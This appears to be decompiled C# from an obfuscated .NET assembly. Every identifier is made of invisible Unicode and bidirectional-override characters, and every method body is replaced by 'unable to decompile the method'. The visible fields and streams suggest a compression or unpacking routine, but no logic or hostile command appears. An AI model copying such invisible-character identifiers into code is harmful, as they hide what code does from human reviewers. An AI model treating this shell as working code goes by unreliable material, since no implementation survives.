  internal class \u202A⁯⁯‬‏⁮⁭⁮‫‏⁪⁬⁬‪⁭⁫​⁫‪⁮​⁮⁬‮‭‎⁭‫‪‪⁯⁭‭‌‏⁪‎⁪‬⁮‮
  {
    internal readonly \u003CModule\u003E.\u206E‭‭‌‌​‏‌‪‫​⁬‌‌‏‮⁬‫⁯‫‬‫‪‏‪⁫‪⁯​‏‮‌‪​⁬‏‬⁮​⁬‮[] \u200E⁯‪⁬⁭‪​‮⁪‪⁬⁯⁯⁫⁪⁮‬‌‏⁫‪‍⁪​‭‌‫⁮⁮‭‪⁮‮⁭⁪‫‭‬​⁮‮;
    internal readonly \u003CModule\u003E.\u206E‭‭‌‌​‏‌‪‫​⁬‌‌‏‮⁬‫⁯‫‬‫‪‏‪⁫‪⁯​‏‮‌‪​⁬‏‬⁮​⁬‮[] \u202B‌⁬‬‮⁬⁬⁬‭‬⁯‍‭‮⁯⁯‏‍⁮⁬⁫⁭⁪‎‪‌⁫⁯⁪‭​⁯‫‬‏⁮​​​⁯‮;
    internal readonly \u003CModule\u003E.\u206E‭‭‌‌​‏‌‪‫​⁬‌‌‏‮⁬‫⁯‫‬‫‪‏‪⁫‪⁯​‏‮‌‪​⁬‏‬⁮​⁬‮[] \u200F‫‪⁫‌‍‎⁭⁯‮⁭⁮‌​‪​⁬‮‏‭⁮‭⁫⁪‍​​‬‏‪‫‏‪‪⁭⁫⁭‎‮‌‮;
    internal readonly \u003CModule\u003E.\u206E‭‭‌‌​‏‌‪‫​⁬‌‌‏‮⁬‫⁯‫‬‫‪‏‪⁫‪⁯​‏‮‌‪​⁬‏‬⁮​⁬‮[] \u202E‪‮‎⁯‌‍⁭⁮‏‌‪⁪‍‎‭⁬‮‪⁪⁪‍⁮⁫‪⁯⁯⁫‮‏⁪‪‍⁮⁮‫⁪⁪‬‪‮;
    internal readonly \u003CModule\u003E.\u206E‭‭‌‌​‏‌‪‫​⁬‌‌‏‮⁬‫⁯‫‬‫‪‏‪⁫‪⁯​‏‮‌‪​⁬‏‬⁮​⁬‮[] \u202E‍‎‏‌⁬⁪⁪⁪​​⁮‌‌‫​⁮‮⁪‪⁮⁯‍​‫‏‏​‎‏⁯‌⁬‍‌⁫‌⁯‎‪‮;
    internal readonly \u003CModule\u003E.\u206E‭‭‌‌​‏‌‪‫​⁬‌‌‏‮⁬‫⁯‫‬‫‪‏‪⁫‪⁯​‏‮‌‪​⁬‏‬⁮​⁬‮[] \u202D‮⁬‎‮‭‍‏‍⁯⁯⁫⁪‍⁯‎‮‪⁮⁭‫‎‪⁯‍‭⁯⁫‎⁮‎‪⁪⁪⁫⁬⁪⁫⁭‬‮;
    internal readonly \u003CModule\u003E.\u202A⁯⁯‬‏⁮⁭⁮‫‏⁪⁬⁬‪⁭⁫​⁫‪⁮​⁮⁬‮‭‎⁭‫‪‪⁯⁭‭‌‏⁪‎⁪‬⁮‮.\u202B‬⁬‍‬​⁮‍‮‍‌‪‪‌⁪⁪⁫‌‎⁯​‬⁮‭⁮‏‭‭‬‪⁭⁯‏‍⁪‬‪⁪⁬⁯‮ \u206F⁮‪‌‍‬‌‪⁬⁪⁮‮‫‮⁮⁯‮⁬​⁭​⁪⁫‏⁮‮‪‮⁯‫⁮⁭⁯‫‍‪⁮‪‪‍‮;
    internal readonly \u003CModule\u003E.\u202A⁯⁯‬‏⁮⁭⁮‫‏⁪⁬⁬‪⁭⁫​⁫‪⁮​⁮⁬‮‭‎⁭‫‪‪⁯⁭‭‌‏⁪‎⁪‬⁮‮.\u206F⁮​⁬​‬⁬‌⁮‪⁫‮⁪‮⁭‪‏‌⁯⁭‍‮‍‍⁬⁯​⁫‫‍⁮⁮‌⁫‍‭⁮‌⁪‭‮ \u206F⁯‪‮⁭⁬‪‏‭⁮‌‌‌‭⁮⁫⁯‮⁫‪⁪⁯‏‫‮‌⁬‪‍‫‬‌⁬‮‪‭‌‍‮‭‮;
    internal readonly \u003CModule\u003E.\u202D⁪‬⁫⁫‌‪‭‭⁫‬​‍‮‌‫‍‏⁯​‮⁬‭⁬‮‏‭⁪⁯‪‭‪‬⁯‫⁯‎⁫‏⁮‮ \u206B⁮‏‌⁭‫⁭‫‪⁮‍‮‬⁪⁬‬‬​‬‬‮‫⁭⁮‮‍⁪‭⁮‏‌‭‫⁭⁫‪⁬‭‏⁬‮;
    internal readonly \u003CModule\u003E.\u206E‭‭‌‌​‏‌‪‫​⁬‌‌‏‮⁬‫⁯‫‬‫‪‏‪⁫‪⁯​‏‮‌‪​⁬‏‬⁮​⁬‮[] \u202D⁫‭‫⁪​‍⁪​⁫‭⁮‏‬‍‪​‮⁮⁭‌‭​⁯⁫​‍‌⁪‌⁬‌‎⁫⁭‏⁭​‬⁯‮;
    internal readonly \u003CModule\u003E.\u202C⁪‮‏⁫⁬⁮‫⁭⁬⁪⁮⁮‮⁬‌‭‎‎‫⁫‬⁪⁭‪⁯⁫⁭‫​⁭‬‭‌‍⁭⁭‬‍⁪‮[] \u200B‮⁫‪⁭⁪⁮‌‪‎​⁬⁫‪‮⁪‬‏‮‎⁫‫‪‮‫‏​‭⁮‮‏⁯‮‌‬​‫‫‮‎‮;
    internal readonly \u003CModule\u003E.\u206C‮‭‍⁯⁭⁭‍‏⁫‭⁫⁯‏‮⁬‬‍‫​⁭⁪⁭⁪⁭‭‎‮‍‌‮‫⁫⁭⁮‍​⁬‏‭‮ \u206F⁮‎​‌⁯⁫​​⁫⁭‮‌‎‪⁮⁫⁬‪‏⁭‭‫‪⁯⁬​​‫⁫‪⁪⁮‏‬‏‏⁫⁯‬‮;
    internal readonly \u003CModule\u003E.\u202A⁯⁯‬‏⁮⁭⁮‫‏⁪⁬⁬‪⁭⁫​⁫‪⁮​⁮⁬‮‭‎⁭‫‪‪⁯⁭‭‌‏⁪‎⁪‬⁮‮.\u202B‬⁬‍‬​⁮‍‮‍‌‪‪‌⁪⁪⁫‌‎⁯​‬⁮‭⁮‏‭‭‬‪⁭⁯‏‍⁪‬‪⁪⁬⁯‮ \u202B⁬‭‏‮‏‬‫⁬⁪‮‬⁭‌‏⁯‎‪‫⁬‭‌‍‫⁯‍⁪‍‬‏‬‬⁮⁪​‬⁬⁯‬⁯‮;
    internal bool \u206F⁫‫‫⁫‬‌​‫⁫‬‮⁮‏‮​‮‭‬⁬⁭⁯⁯‏‬⁫⁮‪‪​‫⁮⁬‮⁭⁯‮‏⁯⁮‮;
    internal uint \u202E‍⁬‏‌⁯⁯⁪‪⁬‍‮‬‭‬‎‮‭‌‏‪⁭⁯⁭⁫‫‭‏⁭‏⁬‮‫‭‭⁯‬⁫‏⁭‮;
    internal uint \u202D‌‏‭⁫‎‬⁯‭⁭⁫⁯‍⁯‍⁯⁭‏‬‮⁮‏‍‫‎‎‪⁮‍‮​⁯⁮‫‌‍‎‪⁮‫‮;
    internal \u003CModule\u003E.\u202C⁪‮‏⁫⁬⁮‫⁭⁬⁪⁮⁮‮⁬‌‭‎‎‫⁫‬⁪⁭‪⁯⁫⁭‫​⁭‬‭‌‍⁭⁭‬‍⁪‮ \u200D‎‬‮‏‪⁬⁪‬‪‪⁭‫‌‭⁭‏⁫‫⁬⁬⁯‎‬​‏‬⁬‍‭⁮⁬⁮‬‌⁬⁭‍⁫‫‮;
    internal uint \u202A‪⁪‌‬⁪‎​⁫⁫‌​‏‫‬​‫‍⁫​⁭‪‭⁫‬‎‎​‭‭‍‌⁮‌⁯‮‫‭⁫‫‮;

    internal \u202A⁯⁯‬‏⁮⁭⁮‫‏⁪⁬⁬‪⁭⁫​⁫‪⁮​⁮⁬‮‭‎⁭‫‪‪⁯⁭‭‌‏⁪‎⁪‬⁮‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200F‪⁫​‮⁭⁬‭⁫⁪⁬⁯⁯‎​⁭‫⁪‎⁫‪‬⁪⁭‏​‮​​⁪‫‬‍‎‌‌⁬‌⁪⁮‮([In] uint obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206B‪‏‏​‪⁯‮‍⁪‫‎⁪‫‫‭‬‭⁮​‍‌⁯‫‏‭⁮⁬‮‫‏‏⁯⁪‎‍‍⁪⁮‌‮([In] int obj0, [In] int obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200E‬‪‫⁭‎⁭‫‬‬​‪‎​​‮‍⁬​​‪‌‌​‏⁭‬‌‭​‮‫‭‭‭‎‏‮‍‫‮([In] int obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206F‌‍‏⁬⁯⁭‪‏⁪‫‏⁪⁬‌⁫‬‫⁫‎‎‮‎‎​‬‬‮‏⁯⁫⁭‫‌‎‎‍​‫‬‮([In] Stream obj0, [In] Stream obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202B‌‎‏⁪‎⁭​⁯‪​‮⁫‭⁪‍‬‮‎‫‌‬⁮‌‏‪‪‮⁪​‬‏‪⁮‏‌​⁯‪‎‮(
      [In] Stream obj0,
      [In] Stream obj1,
      [In] long obj2,
      [In] long obj3)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206F‭‫⁮⁪‭‪⁯‭⁮⁪‮‬‭‍‬‫⁯‭‌‭⁪⁫⁫‪‍‎⁪‍⁮‪⁮⁯‎‪‭⁫‪‬⁪‮([In] byte[] obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static uint \u200B​⁫‮⁫⁫‎⁭⁭‪⁯‮‏‏⁬‭‭‮‪⁪⁪​‬‍⁫‮‏⁬‍‬⁮⁯‮⁬⁬⁬⁮⁮‪‮‮([In] uint obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal class \u202B‬⁬‍‬​⁮‍‮‍‌‪‪‌⁪⁪⁫‌‎⁯​‬⁮‭⁮‏‭‭‬‪⁭⁯‏‍⁪‬‪⁪⁬⁯‮
    {
      internal readonly \u003CModule\u003E.\u202C⁪‮‏⁫⁬⁮‫⁭⁬⁪⁮⁮‮⁬‌‭‎‎‫⁫‬⁪⁭‪⁯⁫⁭‫​⁭‬‭‌‍⁭⁭‬‍⁪‮[] \u202D​‪‌‬⁮‌‮‏‍‮⁯‎‌‮⁬⁭⁭⁬⁯⁪‭‭‍⁭‌⁫‭‬⁫‭‎‫⁮‬‫⁭⁫⁬⁬‮;
      internal readonly \u003CModule\u003E.\u202C⁪‮‏⁫⁬⁮‫⁭⁬⁪⁮⁮‮⁬‌‭‎‎‫⁫‬⁪⁭‪⁯⁫⁭‫​⁭‬‭‌‍⁭⁭‬‍⁪‮[] \u200F‬‭‭⁭‍‍​​⁮⁫⁪⁭‍‍‌‭‬⁭⁫⁮⁬‮‏‌‮​‎‪‭‪‪‪‭​‌⁮⁬⁯⁬‮;
      internal \u003CModule\u003E.\u206E‭‭‌‌​‏‌‪‫​⁬‌‌‏‮⁬‫⁯‫‬‫‪‏‪⁫‪⁯​‏‮‌‪​⁬‏‬⁮​⁬‮ \u202E‪​‍‭‫‍⁬‪⁮‭⁬‭⁪⁬‭‪‮‌‮⁭‌⁯​‎‮‍‌‎⁮⁯⁪‎‎‭⁫⁬‏‎⁯‮;
      internal \u003CModule\u003E.\u206E‭‭‌‌​‏‌‪‫​⁬‌‌‏‮⁬‫⁯‫‬‫‪‏‪⁫‪⁯​‏‮‌‪​⁬‏‬⁮​⁬‮ \u200F​⁪⁭⁯⁪‍‫⁪‪‭‪‫‏‬⁮‪‏⁮⁮​‭⁯​‮⁬⁭‫‫‏⁭‎⁯‬‏‮⁫⁪​⁪‮;
      internal \u003CModule\u003E.\u202C⁪‮‏⁫⁬⁮‫⁭⁬⁪⁮⁮‮⁬‌‭‎‎‫⁫‬⁪⁭‪⁯⁫⁭‫​⁭‬‭‌‍⁭⁭‬‍⁪‮ \u206F⁮⁬⁫‬​‪⁮‌‪⁮‬​‫⁭‌⁫‎‫‏​⁪⁭‍⁫​⁪​⁫​‪⁫‌⁪⁮⁪⁮⁫⁫⁬‮;
      internal uint \u206E⁫‮⁪⁫⁪⁫⁬‏⁯‍​‫‮‮​⁯‏‪‍‪⁫⁮‪⁮⁫‭‏⁭‫⁫‬​⁯⁯‌⁯‌⁭‮‮;

      internal void \u206E‭‬‎‫‌‌‭​‭⁫⁮​⁪‌‪⁬⁫⁬⁬‭⁬⁮⁯⁬⁪⁯⁯⁬‏⁪‬‭‌⁫⁫⁭⁬‏‭‮([In] uint obj0)
      {
        // ISSUE: unable to decompile the method.
      }

      internal void \u206A‫⁮⁫⁯‪‭‎⁭‎‏‫⁮⁬‪‭​⁫⁬‫⁯⁬⁪⁯‮⁯‪​‏⁫‫⁮⁯‮‮‮⁪‬⁪⁬‮()
      {
        // ISSUE: unable to decompile the method.
      }

      internal uint \u202B⁯‭‫‮⁭‌‮‭‍​‌‎‭‫‎⁫​‌‎‮‬⁪​⁫‪‫‪‏‫⁭‍‬‬‪‭‪‌‬‮(
        [In] \u003CModule\u003E.\u206C‮‭‍⁯⁭⁭‍‏⁫‭⁫⁯‏‮⁬‬‍‫​⁭⁪⁭⁪⁭‭‎‮‍‌‮‫⁫⁭⁮‍​⁬‏‭‮ obj0,
        [In] uint obj1)
      {
        // ISSUE: unable to decompile the method.
      }

      internal \u202B‬⁬‍‬​⁮‍‮‍‌‪‪‌⁪⁪⁫‌‎⁯​‬⁮‭⁮‏‭‭‬‪⁭⁯‏‍⁪‬‪⁪⁬⁯‮()
      {
        // ISSUE: unable to decompile the method.
      }
    }

    internal class \u206F⁮​⁬​‬⁬‌⁮‪⁫‮⁪‮⁭‪‏‌⁯⁭‍‮‍‍⁬⁯​⁫‫‍⁮⁮‌⁫‍‭⁮‌⁪‭‮
    {
      internal \u003CModule\u003E.\u202A⁯⁯‬‏⁮⁭⁮‫‏⁪⁬⁬‪⁭⁫​⁫‪⁮​⁮⁬‮‭‎⁭‫‪‪⁯⁭‭‌‏⁪‎⁪‬⁮‮.\u206F⁮​⁬​‬⁬‌⁮‪⁫‮⁪‮⁭‪‏‌⁯⁭‍‮‍‍⁬⁯​⁫‫‍⁮⁮‌⁫‍‭⁮‌⁪‭‮.\u206F‏⁯⁪⁭‫​‭‬⁪⁭⁪⁮‫⁪⁮‪‏​‬​‫‌‮‫⁮​⁭⁬‬⁫‎‎‌‎‮‌‪⁯‭‮[] \u206B‏‫⁯⁫​‬‭‬⁫‫‌‍‪⁪‮​​‫‪‭‬⁫​‍‫‪‍‬⁬‪‭⁫⁬‮‭‫‮⁪‮‮;
      internal int \u202D⁭‎‬‫⁫⁬⁬‏​‎‏⁫⁯‪‬‪‎‭⁪‮⁮‪⁭​‎‏⁫‍‫‭‫‫⁯‬‎⁬⁮‎‫‮;
      internal int \u202C‏‌‌‍‫​‪‪‍‍‍⁭‬‏‌⁯‮‬​⁫‌‫​⁫‏⁯‭‮⁭‎‭‎⁬‌⁭‮⁪‍⁫‮;
      internal uint \u206A‪‎⁬⁮‮⁯‬‪‌‎⁭‮‭‎⁫‮‬‌​‭​‫‭‫‭‪⁫‮‍‍‬‫‍⁬‌‬⁬⁬⁭‮;

      internal void \u202C‍‎⁭‌‬‌‫⁮⁯‍‏‫⁮‬‎‎‪‬⁭‏‭⁪‭‮‬‌‎‮⁯‭‏‫⁮⁯‏​‏‌⁪‮([In] int obj0, [In] int obj1)
      {
        // ISSUE: unable to decompile the method.
      }

      internal void \u202B‪⁯⁪‬​⁮​⁮⁮​⁬‬⁭‮‬‭‍‌⁭⁯‏‪​​‏‭‏⁮‏⁭‍‬‏⁯‍‭‫‭‌‮()
      {
        // ISSUE: unable to decompile the method.
      }

      internal uint \u202B‬⁯⁭‭‍‭‪‮‌‍⁭‌⁪⁮‎‌⁬‫‭⁬​‏‏⁮‎​‍‮‭⁯‮​‪⁪⁭⁬‮⁯‍‮([In] uint obj0, [In] byte obj1)
      {
        // ISSUE: unable to decompile the method.
      }

      internal byte \u202C⁪⁮⁯‍‏‬‏​‏‎​‎⁭‪​⁯‫‮​⁪⁭‪​‌​​‭‭​​‌⁫⁬⁭⁫‮‫⁯⁮‮(
        [In] \u003CModule\u003E.\u206C‮‭‍⁯⁭⁭‍‏⁫‭⁫⁯‏‮⁬‬‍‫​⁭⁪⁭⁪⁭‭‎‮‍‌‮‫⁫⁭⁮‍​⁬‏‭‮ obj0,
        [In] uint obj1,
        [In] byte obj2)
      {
        // ISSUE: unable to decompile the method.
      }

      internal byte \u206E‌‮⁭⁮⁫‪‏‮‪‬‏‌‪‭​‌⁪‬‬‬‪‭‫‎‎‎‬‫‫‫‮‪‌‬⁭‪⁮⁭‌‮(
        [In] \u003CModule\u003E.\u206C‮‭‍⁯⁭⁭‍‏⁫‭⁫⁯‏‮⁬‬‍‫​⁭⁪⁭⁪⁭‭‎‮‍‌‮‫⁫⁭⁮‍​⁬‏‭‮ obj0,
        [In] uint obj1,
        [In] byte obj2,
        [In] byte obj3)
      {
        // ISSUE: unable to decompile the method.
      }

      internal \u206F⁮​⁬​‬⁬‌⁮‪⁫‮⁪‮⁭‪‏‌⁯⁭‍‮‍‍⁬⁯​⁫‫‍⁮⁮‌⁫‍‭⁮‌⁪‭‮()
      {
        // ISSUE: unable to decompile the method.
      }

      internal struct \u206F‏⁯⁪⁭‫​‭‬⁪⁭⁪⁮‫⁪⁮‪‏​‬​‫‌‮‫⁮​⁭⁬‬⁫‎‎‌‎‮‌‪⁯‭‮
      {
        internal \u003CModule\u003E.\u206E‭‭‌‌​‏‌‪‫​⁬‌‌‏‮⁬‫⁯‫‬‫‪‏‪⁫‪⁯​‏‮‌‪​⁬‏‬⁮​⁬‮[] \u200F‎‬⁫⁬⁪⁯⁯​‎‎⁭​⁮⁬‫‎‍⁪‌⁫‍‬⁭⁮‌‫‏‭‭⁮⁪‌⁬⁯⁭‍‮‬‍‮;

        internal void \u206D‌‭‮‌‎‬‫‌‫‭‫‫⁫⁫‫‫⁬‫⁯⁪‬⁬‌⁭⁪‌​‫⁯‬⁫⁭⁭⁪​⁭⁮⁫‏‮()
        {
          // ISSUE: unable to decompile the method.
        }

        internal void \u200E​⁬‮‬⁮‮‏‮‏‫⁭‬⁭⁪‮⁪‭⁮‫​‏⁪⁫‪‬‫⁫​⁪​‍‬​⁭‮‫‏⁭‭‮()
        {
          // ISSUE: unable to decompile the method.
        }

        internal byte \u200C​‮⁫⁮‫‎‮‪⁪⁫‬⁭⁪⁬‮​⁯⁬‭⁯‏‮⁪⁫‌‫‌‫⁪⁭⁬‮⁭‌​⁮⁭⁬‪‮(
          [In] \u003CModule\u003E.\u206C‮‭‍⁯⁭⁭‍‏⁫‭⁫⁯‏‮⁬‬‍‫​⁭⁪⁭⁪⁭‭‎‮‍‌‮‫⁫⁭⁮‍​⁬‏‭‮ obj0)
        {
          // ISSUE: unable to decompile the method.
        }

        internal byte \u206E⁫‫‮⁬‫​‏⁫‏‌⁯⁫‭‎‫‌⁭‌⁭‫‎​⁯‮‫⁪⁮​‪‎‪⁭⁮‫‭‪‬‭‬‮(
          [In] \u003CModule\u003E.\u206C‮‭‍⁯⁭⁭‍‏⁫‭⁫⁯‏‮⁬‬‍‫​⁭⁪⁭⁪⁭‭‎‮‍‌‮‫⁫⁭⁮‍​⁬‏‭‮ obj0,
          [In] byte obj1)
        {
          // ISSUE: unable to decompile the method.
        }
      }
    }
  }

  internal class \u202D⁪‬⁫⁫‌‪‭‭⁫‬​‍‮‌‫‍‏⁯​‮⁬‭⁬‮‏‭⁪⁯‪‭‪‬⁯‫⁯‎⁫‏⁮‮
  {
    internal byte[] \u202E‌⁬‭‏‪⁮‮‌⁭‌⁬‬‭‫⁪‍​​‭⁪​‮‍‫‎‪‭⁭​⁮⁮⁪⁯‬‌‌⁭⁯‌‮;
    internal uint \u200F‫‬​⁯‌‬‮⁮‎‏⁬‭⁯⁯‎‫‮‪‬‌‎‍‫⁯‌⁯⁮‍⁭‫‭⁭⁯⁭‬⁭‮‭‏‮;
    internal Stream \u206D‭‭‪‫‌‪‎‭‬⁮⁮‍‮⁯‎‫⁯‎‌⁯‭‏‫‮⁫⁫⁫‫​​‫‫⁭‏​⁭‏⁮‫‮;
    internal uint \u206E‎​⁬‭‪⁬‭‎⁪‪⁬⁬‎‭⁮​⁭​‍‪​‭‌‏‭⁭‎‎⁬‫‮‌‮‎⁯‌‎⁭⁭‮;
    internal uint \u200E‫‎‬⁫⁬⁯‬⁭‫‏⁯‮‬‭‎‎​‍⁯⁭‬⁭‭⁮‭‏‭⁫‪‏‎⁫‮‫‌‬⁫‌‮;

    internal void \u200D‮⁯⁯‫⁯‌⁫‮‍⁭​‌‏‌‍‌‬‌⁭‎‮‬‫⁪⁯‬⁫‫​‎⁬⁮‏‌‬⁭‬⁮⁬‮([In] uint obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202C‎‮⁬‏⁫⁬⁬‮⁫‏‎⁬‏‎​⁪‫‮⁪‌‬⁭‮‎‪⁯‫‪‪​‮⁮‮⁫⁬‍‏‌‍‮([In] Stream obj0, [In] bool obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206D⁭⁮⁯⁮‎‮⁫‭⁬⁭⁫⁫⁪⁯‌‭⁫‭⁯⁪‎​‍‎‮⁪⁭⁬‫⁯‪​⁬‬⁫⁯‮‎‭‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206E‎‭⁯‭‍⁯⁭⁪⁯‌⁬‍⁪⁯‪⁯‫‬‎⁮⁯⁮‪‌‏‌⁯⁭‏‪⁮​​⁬‭‌​‪‮‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206F⁮⁮‏⁫⁬⁮‎‭‍⁭‬‪‍⁯⁬‪‍‍‏‌‌​⁫‭‎​⁫⁭‫⁪‪​‫‏‮‭‭‪‎‮([In] uint obj0, [In] uint obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206B‌⁫‍‌‮‫⁪⁬‬‍‬⁯⁪⁫‎⁪​⁬⁯⁫‏‪‮‎‭⁪‎‍⁬‬⁬⁫⁭‮⁬⁪‎‪‭‮([In] byte obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal byte \u206E⁫‎⁮‮‌‌⁮‭‌‎‬‪‫‍‮‫‬‎‬‎‎​⁯‭‎​‮⁫⁪‮‏‌⁯⁫‭‫⁬‌‬‮([In] uint obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal \u202D⁪‬⁫⁫‌‪‭‭⁫‬​‍‮‌‫‍‏⁯​‮⁬‭⁬‮‏‭⁪⁯‪‭‪‬⁯‫⁯‎⁫‏⁮‮()
    {
      // ISSUE: unable to decompile the method.
    }
  }

  internal struct \u202D‫⁬‌⁫⁫‌‏⁯⁫‪⁪‭‎‫‫‭⁫‎⁫‫⁯‫⁫‬‫‌⁯‏​​‎‫‍​⁪‎⁫⁪‏‮
  {
    internal uint \u202B⁪‭⁮‬‌‌⁭​⁮​⁬‭⁫‭‍‪⁯​‫‌‏⁬‏⁯⁪⁭‪⁫⁮⁮‭​‮⁮‌‎⁭‬‫‮;

    internal void \u200C⁬‌⁮‮⁮‬‏⁪‍‪‌⁮‏‪‌⁮​​‪‎⁪‌⁮⁯‭⁪‭‬‍‭‫‮‬‪⁬‪⁫⁪‌‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202D⁪‍‭‮‌‎​⁭‏⁯‏‍‏‌‪​‬‌⁮‏‭​⁪‎‮⁯​⁬‍‭‮‭⁭​‌⁮⁮‌‎‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200D‎‮⁯⁬‎‎⁯‍​⁮⁮‭‫‌‌⁪⁯⁬‌‭⁫‬‏‫‌‬‪​⁭‏‭‪‮⁯‬‪⁮⁬‭‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200E⁬⁮⁮‍‭⁫⁭⁭‮⁬⁯⁭⁪⁭​‬​‎‪⁭‮⁮‬‭‬‪⁬‌⁭​​‪‭⁯‮‮​⁯‌‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200F⁭⁯⁬⁮‫⁭‮⁯‭⁮‪​‫‍⁭⁮‪‮⁯⁪⁪‏‪‍‌‌‫⁪‌⁮​⁬⁭‭⁫‍‬‬‎‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal bool \u202D‬⁬‍‌‪‫‌‮⁬⁬‮‪⁭‬‎​⁯‬​⁪‭‫‫‭‍‌⁫‏⁪‌⁮‮‌‭​‫⁮​‬‮()
    {
      // ISSUE: unable to decompile the method.
    }
  }

  [StructLayout(LayoutKind.Explicit, Size = 1792)]
  internal struct \u206D‪⁭‬‭‌​⁮⁫⁭‬‌⁪⁭⁯⁪‪‎‍‬‭‎‏‫⁯‫‏​‭‎‍‎‬‭‌⁪⁭‭⁪‭‮
  {
  }

  [StructLayout(LayoutKind.Explicit, Size = 50176, Pack = 1)]
  internal struct \u206A‌‏‪‮‏‮​​‎‍‌‍‫‌‌⁮⁫‏⁮‫​‬‎⁬‬⁫⁯‬⁫⁮‎‎‪⁯‪⁭‪‬‪‮
  {
  }
}
